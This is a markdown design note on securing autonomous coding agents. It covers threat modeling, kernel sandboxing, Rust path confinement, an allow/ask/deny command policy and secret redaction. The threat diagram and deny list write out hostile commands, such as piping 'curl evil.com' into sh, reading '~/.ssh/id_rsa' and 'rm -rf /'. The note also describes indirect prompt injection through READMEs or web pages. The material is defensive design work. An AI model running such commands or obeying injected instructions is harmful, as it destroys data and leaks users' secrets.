# 07: Security, Sandboxing & Permission Systems

> **Focus Area:** Threat Modeling, Prompt Injection as Untrusted Data, OS Sandboxing (Seatbelt, Landlock), Path Confinement, Command Allow/Ask/Deny Rules.

---

## 1. Threat Modeling for Coding Agents

Autonomous agents present severe security attack surfaces because they execute arbitrary code and commands:

```
External Web / File / Repo ──► Untrusted Content ──► Prompt Injection Attempt
                                                            │
                                                            ▼
                                              Model Proposes Malicious Action
                                              (e.g., `curl evil.com | sh`,
                                               read `~/.ssh/id_rsa`,
                                               `rm -rf /`)
                                                            │
                                                            ▼
                                              Harness Security Layers
                                              1. Path Confinement
                                              2. Command Policy Engine
                                              3. Kernel Sandbox Confinement
```

### Threat Vectors:
1. **Indirect Prompt Injection:** A README file or web page instructs the agent to leak secrets or delete files.
2. **Path Traversal:** An edit tool targeting `../../../../etc/passwd`.
3. **Destructive Shell Commands:** `git push --force`, `rm -rf`, or exfiltration via `curl`.
4. **Environment Leakage:** Leaking API tokens (`OPENAI_API_KEY`, SSH keys) into logs or prompts.

---

## 2. Kernel-Level Sandboxing

Application-level checks are not enough; malicious subprocesses can bypass them. Kernel-level sandboxing is essential:

### macOS: Seatbelt (`sandbox-exec`)
- Built directly into macOS (`/usr/bin/sandbox-exec`).
- Pass a declarative Scheme profile limiting operations:
  - Allow read-only access to system binaries (`/bin`, `/usr`, `/Applications`).
  - Restrict file writes strictly to the active workspace directory.
  - Disable inbound and outbound socket connections (network egress) by default.

### Linux: Landlock & Seccomp
- **Landlock:** Unprivileged filesystem access control module in the Linux kernel (kernel $\ge$ 5.13).
- **Seccomp-BPF:** Restricts dangerous system calls (`ptrace`, `reboot`, raw socket creation).
- **Bubblewrap (`bwrap`):** Lightweight container-like sandboxing without Docker daemon overhead.

---

## 3. Strict Path Confinement

Every file operation (`read`, `write`, `edit`, `delete`) must pass strict canonicalization:
```rust
pub fn resolve_safe_path(workspace_root: &Path, requested_path: &Path) -> Result<PathBuf, SecurityError> {
    let resolved = workspace_root.join(requested_path).canonicalize()?;
    let canonical_root = workspace_root.canonicalize()?;
    
    if !resolved.starts_with(&canonical_root) {
        return Err(SecurityError::PathEscape(resolved));
    }
    Ok(resolved)
}
```
- Rejects `..` path traversals and malicious symlink escapes.
- Enforces read-only access to protected system folders.

---

## 4. Command Permission Rules: Allow / Ask / Deny Engine

Shell command execution is governed by a declarative policy:

```toml
[permissions]
# Commands allowed without prompting the user
allow = [
    "cargo check",
    "cargo test *",
    "git status",
    "git diff",
    "ls *",
    "cat *"
]

# Commands that trigger an interactive prompt in TUI/GUI
ask = [
    "cargo build --release",
    "npm install *",
    "pip install *"
]

# Commands that are unconditionally blocked
deny = [
    "rm -rf /",
    "rm -rf ~/*",
    "git push --force*",
    "curl * | *sh",
    "*id_rsa*"
]
```

---

## 5. Secrets Scrubbing & Sanitization

1. **Subprocess Environment Isolation:** Never pass the full parent process environment variables to shell subprocesses. Whitelist safe variables (`PATH`, `HOME`, `USER`, `LANG`).
2. **Transcript Redaction:** Regex-scrub sensitive patterns (`ghp_.*`, `sk-.*`, AWS keys) before appending logs to the session transcript.
